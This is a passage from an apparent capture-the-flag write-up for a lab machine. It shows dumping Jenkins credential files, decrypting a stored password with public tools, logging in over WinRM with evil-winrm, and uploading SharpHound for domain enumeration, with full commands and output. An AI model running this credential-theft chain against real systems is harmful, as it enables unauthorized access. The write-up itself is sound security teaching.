+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ni</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+17:43:49.158637 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 3, seq 27762, length 40
+17:43:49.158711 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 3, seq 27762, length 40
+17:43:50.166486 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 3, seq 27765, length 40
+17:43:50.166516 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 3, seq 27765, length 40
+17:43:51.182067 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 3, seq 27768, length 40
+17:43:51.182096 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 3, seq 27768, length 40
+17:43:52.197333 IP 10.10.11.132 &gt; 10.10.14.6: ICMP echo request, id 3, seq 27771, length 40
+17:43:52.197371 IP 10.10.14.6 &gt; 10.10.11.132: ICMP echo reply, id 3, seq 27771, length 40
+</span></code></pre></div></div>
+<h3 id="jenkins-enumeration">Jenkins Enumeration</h3>
+<h4 id="look-for-creds">Look for Creds</h4>
+<p>I’ll look for the creds associated with the admin account. This could get more access in Jenkins, or perhaps give WinRM access to the host. <a href="https://blog.searce.com/jenkins-change-the-forgotten-password-525169ba1c34">This article</a> talks about how each user’s information is stored in a <code class="language-plaintext highlighter-rouge">config.xml</code> file. <a href="https://www.jenkins.io/doc/developer/security/secrets/">This article</a> talks about the encryption used to store secrets.</p>
+<p><em>Note: I’m still running commands by editing the job, triggering it, and then checking the console output. For the sake of readability, I’ll just be showing the output from this point on unless there’s a reason to show it.</em></p>
+<p>Looking at the previous console returns, it’s clear the job is running from <code class="language-plaintext highlighter-rouge">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job</code>. Looking up a couple directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="o">..</span><span class="nx">\..</span><span class="w"> 
+</span><span class="go">
+
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        2/27/2022   3:49 AM                jobs                                                                  
+d-----       10/20/2021  10:19 PM                logs                                                                  
+d-----       10/20/2021  10:08 PM                nodes                                                                 
+d-----       10/20/2021  10:12 PM                plugins                                                               
+d-----       10/20/2021  10:26 PM                secrets                                                               
+d-----       10/25/2021  10:31 PM                updates                                                               
+d-----       10/20/2021  10:08 PM                userContent                                                           
+d-----        2/26/2022   1:59 PM                users                                                                 
+d-----       10/20/2021  10:13 PM                workflow-libs                                                         
+d-----        2/27/2022   3:33 AM                workspace                                                             
+-a----        2/26/2022   1:39 PM              0 .lastStarted                                                          
+-a----        2/27/2022   9:58 AM             41 .owner                                                                
+-a----        2/26/2022   1:39 PM           2505 config.xml                                                            
+-a----        2/26/2022   1:39 PM            156 hudson.model.UpdateCenter.xml                                         
+-a----       10/20/2021  10:13 PM            375 hudson.plugins.git.GitTool.xml                                        
+-a----       10/20/2021  10:08 PM           1712 identity.key.enc                                                      
+-a----        2/26/2022   1:39 PM              5 jenkins.install.InstallUtil.lastExecVersion                           
+-a----       10/20/2021  10:14 PM              5 jenkins.install.UpgradeWizard.state                                   
+-a----       10/20/2021  10:14 PM            179 jenkins.model.JenkinsLocationConfiguration.xml                        
+-a----       10/20/2021  10:21 PM            357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml           
+-a----       10/20/2021  10:21 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml              
+-a----       10/20/2021  10:21 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml                  
+-a----       10/20/2021  10:08 PM            171 jenkins.telemetry.Correlator.xml                                      
+-a----        2/26/2022   1:39 PM            907 nodeMonitors.xml                                                      
+-a----        2/27/2022  10:06 AM            856 queue.xml                                                             
+-a----       10/20/2021  10:28 PM            129 queue.xml.bak                                                         
+-a----       10/20/2021  10:08 PM             64 secret.key                                                            
+-a----       10/20/2021  10:08 PM              0 secret.key.not-so-secret
+</span></code></pre></div></div>
+<p>The user information is stored in <code class="language-plaintext highlighter-rouge">/users/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="o">..</span><span class="nx">\..\users\</span><span class="w"> 
+</span><span class="go">
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/27/2022  10:30 AM                0xdf_4936803374376763548
+d-----       10/21/2021   2:22 AM                admin_17207690984073220035
+-a----        2/26/2022   1:59 PM            402 users.xml
+</span></code></pre></div></div>
+<p>In that admin directory, there’s a <code class="language-plaintext highlighter-rouge">config.xml</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="o">..</span><span class="nx">\..\users\admin_17207690984073220035</span><span class="w"> 
+</span><span class="go">
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/21/2021   2:22 AM           3186 config.xml 
+</span></code></pre></div></div>
+<p>I’ll dump that file and save it to my local workstation:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.1' encoding='UTF-8'?&gt;</span>
+<span class="nt">&lt;user&gt;</span>
+  <span class="nt">&lt;version&gt;</span>10<span class="nt">&lt;/version&gt;</span>
+  <span class="nt">&lt;id&gt;</span>admin<span class="nt">&lt;/id&gt;</span>
+  <span class="nt">&lt;fullName&gt;</span>admin<span class="nt">&lt;/fullName&gt;</span>
+  <span class="nt">&lt;properties&gt;</span>
+    <span class="nt">&lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty</span> <span class="na">plugin=</span><span class="s">"credentials@2.6.1"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;domainCredentialsMap</span> <span class="na">class=</span><span class="s">"hudson.util.CopyOnWriteMap$Hash"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;entry&gt;</span>
+          <span class="nt">&lt;com.cloudbees.plugins.credentials.domains.Domain&gt;</span>
+            <span class="nt">&lt;specifications/&gt;</span>
+          <span class="nt">&lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;</span>
+          <span class="nt">&lt;java.util.concurrent.CopyOnWriteArrayList&gt;</span>
+            <span class="nt">&lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;</span>
+              <span class="nt">&lt;id&gt;</span>320a60b9-1e5c-4399-8afe-44466c9cde9e<span class="nt">&lt;/id&gt;</span>
+              <span class="nt">&lt;description&gt;&lt;/description&gt;</span>
+              <span class="nt">&lt;username&gt;</span>oliver<span class="nt">&lt;/username&gt;</span>
+              <span class="nt">&lt;password&gt;</span>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}<span class="nt">&lt;/password&gt;</span>
+              <span class="nt">&lt;usernameSecret&gt;</span>false<span class="nt">&lt;/usernameSecret&gt;</span>
+            <span class="nt">&lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;</span>
+          <span class="nt">&lt;/java.util.concurrent.CopyOnWriteArrayList&gt;</span>
+        <span class="nt">&lt;/entry&gt;</span>
+      <span class="nt">&lt;/domainCredentialsMap&gt;</span>
+    <span class="nt">&lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;</span>
+    <span class="nt">&lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty</span> <span class="na">plugin=</span><span class="s">"email-ext@2.84"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;triggers/&gt;</span>
+    <span class="nt">&lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;</span>
+    <span class="nt">&lt;hudson.model.MyViewsProperty&gt;</span>
+      <span class="nt">&lt;views&gt;</span>
+        <span class="nt">&lt;hudson.model.AllView&gt;</span>
+          <span class="nt">&lt;owner</span> <span class="na">class=</span><span class="s">"hudson.model.MyViewsProperty"</span> <span class="na">reference=</span><span class="s">"../../.."</span><span class="nt">/&gt;</span>
+          <span class="nt">&lt;name&gt;</span>all<span class="nt">&lt;/name&gt;</span>
+          <span class="nt">&lt;filterExecutors&gt;</span>false<span class="nt">&lt;/filterExecutors&gt;</span>
+          <span class="nt">&lt;filterQueue&gt;</span>false<span class="nt">&lt;/filterQueue&gt;</span>
+          <span class="nt">&lt;properties</span> <span class="na">class=</span><span class="s">"hudson.model.View$PropertyList"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/hudson.model.AllView&gt;</span>
+      <span class="nt">&lt;/views&gt;</span>
+    <span class="nt">&lt;/hudson.model.MyViewsProperty&gt;</span>
+    <span class="nt">&lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty</span> <span class="na">plugin=</span><span class="s">"display-url-api@2.3.5"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;providerId&gt;</span>default<span class="nt">&lt;/providerId&gt;</span>
+    <span class="nt">&lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;</span>
+    <span class="nt">&lt;hudson.model.PaneStatusProperties&gt;</span>
+      <span class="nt">&lt;collapsed/&gt;</span>
+    <span class="nt">&lt;/hudson.model.PaneStatusProperties&gt;</span>
+    <span class="nt">&lt;jenkins.security.seed.UserSeedProperty&gt;</span>
+      <span class="nt">&lt;seed&gt;</span>ea75b5bd80e4763e<span class="nt">&lt;/seed&gt;</span>
+    <span class="nt">&lt;/jenkins.security.seed.UserSeedProperty&gt;</span>
+    <span class="nt">&lt;hudson.search.UserSearchProperty&gt;</span>
+      <span class="nt">&lt;insensitiveSearch&gt;</span>true<span class="nt">&lt;/insensitiveSearch&gt;</span>
+    <span class="nt">&lt;/hudson.search.UserSearchProperty&gt;</span>
+    <span class="nt">&lt;hudson.model.TimeZoneProperty/&gt;</span>
+    <span class="nt">&lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span>
+      <span class="nt">&lt;passwordHash&gt;</span>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW<span class="nt">&lt;/passwordHash&gt;</span>
+    <span class="nt">&lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span>
+    <span class="nt">&lt;hudson.tasks.Mailer_-UserProperty</span> <span class="na">plugin=</span><span class="s">"mailer@1.34"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;emailAddress&gt;</span>admin@object.local<span class="nt">&lt;/emailAddress&gt;</span>
+    <span class="nt">&lt;/hudson.tasks.Mailer_-UserProperty&gt;</span>
+    <span class="nt">&lt;jenkins.security.ApiTokenProperty&gt;</span>
+      <span class="nt">&lt;tokenStore&gt;</span>
+        <span class="nt">&lt;tokenList/&gt;</span>
+      <span class="nt">&lt;/tokenStore&gt;</span>
+    <span class="nt">&lt;/jenkins.security.ApiTokenProperty&gt;</span>
+    <span class="nt">&lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;</span>
+      <span class="nt">&lt;roles&gt;</span>
+        <span class="nt">&lt;string&gt;</span>authenticated<span class="nt">&lt;/string&gt;</span>
+      <span class="nt">&lt;/roles&gt;</span>
+      <span class="nt">&lt;timestamp&gt;</span>1634793332195<span class="nt">&lt;/timestamp&gt;</span>
+    <span class="nt">&lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;</span>
+  <span class="nt">&lt;/properties&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+<p>There’s both a hash and an encrypted password.</p>
+<h4 id="decrypt-password">Decrypt Password</h4>
+<p>I could try to brute force the hash, but decrypting the password will be easier. Most of the references that will come up on Google (like <a href="https://sites.google.com/site/xiangyangsite/home/technical-tips/software-development/jenkins/decrypting-jenkins-passwords">this one</a>) show how to do this through the script console (<code class="language-plaintext highlighter-rouge">/script</code>), but as I showed above, I don’t have access to that.</p>
+<p>I found two repos on Github that had methods for decrypting user passwords stored on Jenkins. <a href="https://github.com/hoto/jenkins-credentials-decryptor">This one</a> is written in Go, and <a href="https://github.com/gquere/pwn_jenkins">this one</a> has a ton of Python scripts for pentesting Jenkins.</p>
+<p>Both require the <code class="language-plaintext highlighter-rouge">config.xml</code>, as well as <code class="language-plaintext highlighter-rouge">master.key</code> and <code class="language-plaintext highlighter-rouge">hudson.util.Secret</code>, but from <code class="language-plaintext highlighter-rouge">/secrets/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="o">..</span><span class="nx">\..\secrets</span><span class="w"> 
+</span><span class="go">
+    Directory: C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       10/20/2021  10:08 PM                filepath-filters.d                                                    
+d-----       10/20/2021  10:08 PM                whitelisted-callables.d                                               
+-a----       10/20/2021  10:26 PM            272 hudson.console.AnnotatedLargeText.consoleAnnotator                    
+-a----       10/20/2021  10:26 PM             32 hudson.model.Job.serverCookie                                         
+-a----       10/20/2021  10:15 PM            272 hudson.util.Secret                                                    
+-a----       10/20/2021  10:08 PM             32 jenkins.model.Jenkins.crumbSalt                                       
+-a----       10/20/2021  10:08 PM            256 master.key                                                            
+-a----       10/20/2021  10:08 PM            272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY     
+-a----       10/20/2021  10:21 PM              5 slave-to-master-security-kill-switch  
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">master.key</code> looks like it’s stored in hex:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">..</span><span class="nx">\..\secrets\master.key</span><span class="w"> 
+</span><span class="go">f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
+</span></code></pre></div></div>
+<p>I can verify I got the full thing by making sure it’s the same length, 256 bytes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-c</span> master.key 
+<span class="go">256 master.key
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">hudson.util.Secret</code> looks like a binary file:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220228165017916.webp" type="image/webp"/>
+<img alt="image-20220228165017916" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220228165017916.png"/>
+</picture>
+<p>I’ll use PowerShell to base64 <a href="https://docs.microsoft.com/en-us/previous-versions/troubleshoot/winautomation/process-development-tips/text-manipulation/convert-file-to-base64-string-format">encode it</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\0xdf's job&gt;</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="p">[</span><span class="n">convert</span><span class="p">]::</span><span class="nx">ToBase64String</span><span class="p">((</span><span class="n">cat</span><span class="w"> </span><span class="o">..</span><span class="nx">\..\secrets\hudson.util.Secret</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">byte</span><span class="p">))</span><span class="w"> 
+</span><span class="go">gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
+</span></code></pre></div></div>
+<p>Now I can copy that string and <code class="language-plaintext highlighter-rouge">echo</code> it into <code class="language-plaintext highlighter-rouge">base64 -d</code> on my local system to save it to a file.</p>
+<p>Downloading the Go binary from jenkins-credential-decryptor like in <a href="https://github.com/hoto/jenkins-credentials-decryptor#run-using-a-binary">these instructions</a> works great:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-L</span> <span class="se">\</span>
+<span class="gp">&gt;   "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$</span><span class="o">(</span><span class="nb">uname</span> <span class="nt">-s</span><span class="o">)</span>_<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span><span class="s2">" </span><span class="se">\</span><span class="s2">
+</span><span class="go">&gt;    -o jenkins-credentials-decryptor
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   687  100   687    0     0   5088      0 --:--:-- --:--:-- --:--:--  5088
+100 2336k  100 2336k    0     0  4382k      0 --:--:-- --:--:-- --:--:-- 10.3M
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">chmod</span> +x jenkins-credentials-decryptor
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>./jenkins-credentials-decryptor 
+<span class="go">Please provide all required flags.
+
+Usage:
+
+  jenkins-credentials-decryptor \
+    -m master.key \
+    -s hudson.util.Secret \
+    -c credentials.xml \
+    -o json
+
+Flags:
+
+  -c string
+        (required) credentials.xml file location
+  -m string
+        (required) master.key file location
+  -o string
+        (optional) output format [json|text] (default "json")
+  -s string
+        (required) hudson.util.Secret file location
+  -version
+        (optional) show version
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>./jenkins-credentials-decryptor <span class="nt">-m</span> master.key <span class="nt">-s</span> hudson.util.Secret <span class="nt">-c</span> config.xml 
+<span class="go">[
+  {
+    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
+    "password": "c1cdfun_d2434\u0003\u0003\u0003",
+    "username": "oliver"
+  }
+]
+</span></code></pre></div></div>
+<p>The pwn_jenkins <a href="https://github.com/gquere/pwn_jenkins">Python script</a> works as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py
+<span class="go">--2022-02-27 18:47:56--  https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8000::154, 2606:50c0:8001::154, 2606:50c0:8002::154, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6875 (6.7K) [text/plain]
+Saving to: ‘jenkins_offline_decrypt.py’
+
+jenkins_offline_decrypt.py                           100%[=====================================================================================================================&gt;]   6.71K  --.-KB/s    in 0s      
+
+2022-02-27 18:47:57 (14.0 MB/s) - ‘jenkins_offline_decrypt.py’ saved [6875/6875]
+
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>python jenkins_offline_decrypt.py 
+<span class="go">Usage:
+        jenkins_offline_decrypt.py &lt;jenkins_base_path&gt;
+or:
+        jenkins_offline_decrypt.py &lt;master.key&gt; &lt;hudson.util.Secret&gt; [credentials.xml]
+or:
+        jenkins_offline_decrypt.py -i &lt;path&gt; (interactive mode)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>python jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml 
+<span class="go">c1cdfun_d2434
+</span></code></pre></div></div>
+<p>Either way, the password is “c1cdfun_d2434”.</p>
+<h3 id="winrm">WinRM</h3>
+<p>Before logging into Jenkins, I’ll try this password over <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.11.132 <span class="nt">-u</span> oliver <span class="nt">-p</span> c1cdfun_d2434
+<span class="go">
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+</span><span class="gp">*Evil-WinRM* PS C:\Users\oliver\Documents&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>It works!</p>
+<p>I can grab <code class="language-plaintext highlighter-rouge">user.txt</code> as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\oliver\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">user.txt</span><span class="w">
+</span><span class="go">30a27c61************************
+</span></code></pre></div></div>
+<h2 id="shell-as-smith">Shell as smith</h2>
+<h3 id="host-enumeration">Host Enumeration</h3>
+<p>There’s not much else in oliver’s home directory. There are two other non-administrator users with home directories, maria and smith:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Users
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/10/2021   3:20 AM                Administrator
+d-----       10/26/2021   7:59 AM                maria
+d-----       10/26/2021   7:58 AM                oliver
+d-r---        4/10/2020  10:49 AM                Public
+d-----       10/21/2021   3:44 AM                smith
+</span></code></pre></div></div>
+<p>Looking at the listening ports, there are a lot that were not accessible from the outside:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\oliver\desktop&gt;</span><span class="w"> </span><span class="n">netstat</span><span class="w"> </span><span class="nt">-an</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">LISTENING</span><span class="w">
+</span><span class="go">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49692          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:60867          0.0.0.0:0              LISTENING
+  TCP    10.10.11.132:53        0.0.0.0:0              LISTENING
+  TCP    10.10.11.132:139       0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
+...[snip]...
+</span></code></pre></div></div>
+<p>Given the various ports open, this looks like a domain controller.</p>
+<h3 id="bloodhound">Bloodhound</h3>
+<h4 id="collect-data">Collect Data</h4>
+<p>I’ll download <code class="language-plaintext highlighter-rouge">SharpHound.exe</code> from <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe">GitHub</a> and upload it to Object:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">SharpHound.exe</span><span class="w">
+</span><span class="go">Info: Uploading SharpHound.exe to C:\programdata\SharpHound.exe
+
+                                                             
+Data: 1177600 bytes of 1177600 bytes copied
+
+Info: Upload successful!
+</span></code></pre></div></div>
+<p>Unfortunately, it doesn’t run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\sharphound.exe</span><span class="w">                                                         
+</span><span class="go">2022-02-27T11:04:34.8154550-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote                                        
+2022-02-27T11:04:34.8311111-08:00|INFORMATION|Initializing SharpHound at 11:04 AM on 2/27/2022
+2022-02-27T11:04:35.0029449-08:00|ERROR|Unable to connect to LDAP, verify your credentials
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\sharphound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w">                
+</span><span class="go">2022-02-27T11:04:59.5341928-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote               
+2022-02-27T11:04:59.5498244-08:00|INFORMATION|Initializing SharpHound at 11:04 AM on 2/27/2022
+2022-02-27T11:04:59.6904929-08:00|ERROR|Unable to connect to LDAP, verify your credentials
+</span></code></pre></div></div>
+<p>YB1 pointed out to me that there’s <a href="https://github.com/BloodHoundAD/SharpHound/issues/10">an open issue</a> for this on the SharpHound GitHub.</p>
+<p>There typically is also a <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code>, but it’s missing from GitHub. Looking at the history, it was removed a few weeks ago:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220227141846798.png"><img alt="image-20220227141846798" src="https://0xdfimages.gitlab.io/img/image-20220227141846798.png"/><em>Click for full size image</em></a></p>
+<p>I can go back to the previous commit and download the PowerShell script from there. I’ll upload it and run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="nx">SharpHound.ps1</span><span class="w">
+</span><span class="go">Info: Uploading SharpHound.ps1 to C:\programdata\SharpHound.ps1
+
+                                                             
+Data: 1298852 bytes of 1298852 bytes copied
+
+Info: Upload successful!
+
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\SharpHound.ps1</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="nx">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w">
+</span><span class="gp">*Evil-WinRM* PS C:\programdata&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\programdata
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d---s-       10/21/2021   3:13 AM                Microsoft
+d-----       10/21/2021  12:05 AM                regid.1991-06.com.microsoft
+d-----        9/15/2018  12:19 AM                SoftwareDistribution
+d-----        4/10/2020   5:48 AM                ssh
+d-----        4/10/2020  10:49 AM                USOPrivate
